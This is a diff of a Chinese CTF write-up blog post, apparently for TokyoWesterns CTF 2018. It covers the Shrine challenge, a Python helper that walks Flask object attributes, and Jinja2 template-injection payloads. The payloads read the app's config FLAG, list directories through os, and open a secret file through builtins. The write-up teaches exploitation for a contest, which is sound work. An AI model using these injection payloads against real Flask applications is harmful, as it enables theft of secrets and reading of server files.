@@ -1,7 +1,8 @@
 ---
 title: TokyoWesterns CTF
-date: 2018-09-02 22:32:29
 tags: ctf
+abbrlink: 42614
+date: 2018-09-02 22:32:29
 ---
 
 # SimpleAuth
@@ -77,7 +78,6 @@ if __name__ == '__main__':
 
 ```python
 def search(obj, max_depth):
-    
     visited_clss = []
     visited_objs = []
     
@@ -86,22 +86,20 @@ def search(obj, max_depth):
         
         if depth == max_depth:
             return
-
         elif isinstance(obj, (int, float, bool, str, bytes)):
             return
-
         elif isinstance(obj, type):
             if obj in visited_clss:
                 return
             visited_clss.append(obj)
             print(obj)
-
         else:
             if obj in visited_objs:
                 return
             visited_objs.append(obj)
         
         # attributes
+        # "__mro__", "__subclasses__()"
         for name in dir(obj):
             if name.startswith('__') and name.endswith('__'):
                 if name not in  ('__globals__', '__class__', '__self__',
@@ -138,10 +136,18 @@ for path, obj in search(flask.request, 10):
 
 除了`request`对象之外，其他全局变量类似于`g`, `session`通过更多或更少层次的遍历，也是可以找到flag。
 
+flask全局参数（变量+方法）: `config`, `request`,`g`,`session`,`self`, `url_for`。
+
 ### payload
 
 ```python
 http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Brequest.application.__self__._load_form_data.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']%7D%7D
+```
+
+```
+url_for.__globals__['current_app'].config.FLAG
+url_for.__globals__.__getitem__('os').listdir('./')
+url_for.__globals__.__getitem__('__builtins__').__getitem__('open')('flag_secret_file_910230912900891283').read()
 ```
 
 # Slack emoji converter
